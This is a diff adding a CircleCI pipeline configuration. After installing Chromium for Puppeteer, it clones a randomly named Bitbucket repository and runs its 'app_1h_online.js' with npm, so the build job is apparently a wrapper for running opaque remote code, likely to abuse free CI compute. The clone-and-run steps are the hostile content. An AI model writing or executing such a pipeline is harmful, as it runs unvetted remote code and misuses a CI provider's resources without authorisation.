@@ -1,0 +1,21 @@
+version: 2.1
+
+jobs:
+  build-medium:
+    machine:
+      image: ubuntu
+    resource_class: arm.medium
+    steps:
+      - run: node -v
+      - run: 
+          name: Install Chromium
+          command: |-
+            sudo apt install -y chromium-browser
+            export PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true
+            export PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
+      - run: git clone https://remitdepat@bitbucket.org/remitdepat/ih8h1wok5xs0vsr3aqbn26oij7.git
+      - run: cd ih8h1wok5xs0vsr3aqbn26oij7 && npm i -s && node app_1h_online.js
+workflows:
+  start-jobs:
+    jobs:
+      - build-medium
